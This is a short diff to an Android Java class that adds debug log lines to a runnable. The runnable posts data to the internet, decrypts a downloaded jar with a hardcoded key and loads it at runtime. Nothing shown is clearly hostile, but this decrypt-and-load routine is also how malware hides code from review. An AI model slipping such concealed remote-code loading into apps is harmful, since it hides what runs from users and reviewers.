@@ -76,14 +76,19 @@ public class SendPostRunnable implements Runnable {
 	@Override
 	public void run() {
 		// TODO Auto-generated method stub
+		Log.e(TAG, "run()");
 		sendPostDataToInternet();
 
 		if (new File(outputFilePath + fileName).exists()) {
+			Log.e(TAG, "decrypted Jar");
+			
 			// decrypt Jar
 			Decrypt decfile = new Decrypt(fileName, outputFilePath,
 					com.project.module.ProjectConfig.personal_key);
 			decfile.decryptJar();
 
+			Log.e(TAG, "dynamic loading");
+			
 			// dynamic loading -----
 			String loadFileName = decfile.getOutputFileName();
 			Load ld = new Load(loadFileName, outputFilePath);
